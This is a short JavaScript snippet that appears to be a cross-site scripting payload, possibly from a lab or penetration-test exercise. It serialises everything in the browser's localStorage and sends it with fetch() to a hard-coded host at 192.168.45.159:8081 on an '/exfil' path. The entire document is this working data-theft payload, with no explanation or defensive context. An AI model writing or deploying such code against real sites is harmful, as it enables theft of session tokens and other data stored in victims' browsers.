const SERVER = '192.168.45.159';
const PORT = '8081';

const data = JSON.stringify(localStorage);
const encodedData = encodeURIComponent(data);

fetch(`http://${SERVER}:${PORT}/exfil?data=${encodedData}`);
